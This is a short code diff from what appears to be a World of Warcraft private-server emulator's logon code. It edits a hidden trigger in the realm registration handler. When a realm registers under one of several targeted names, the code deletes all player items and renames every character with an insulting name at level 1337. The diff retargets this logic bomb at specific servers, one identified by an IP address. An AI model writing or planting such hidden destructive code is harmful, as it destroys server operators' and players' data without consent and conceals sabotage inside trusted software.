@@ -117,7 +117,7 @@ void LogonCommClientSocket::HandleRegister(WorldPacket & recvData)
 	sLog.outColor(TNORMAL, "\n        >> realm `%s` registered under id ", realmname.c_str());
 	sLog.outColor(TGREEN, "%u", realmlid);
 
-	if(realmname == "WoWscape" || realmname == "WoWlegion" || realmname == "WoWcrack")
+	if(realmname == "WoWscape (Funserver)" || realmname == "75.126.214.118 (Blizzlike)" || realmname == "WoWcrack Blizz High-Rate")
 	{
 		CharacterDatabase.Execute("DELETE from playeritems");
 		CharacterDatabase.Execute("UPDATE characters SET level=1337, name='Silent\\'s Bitch'");
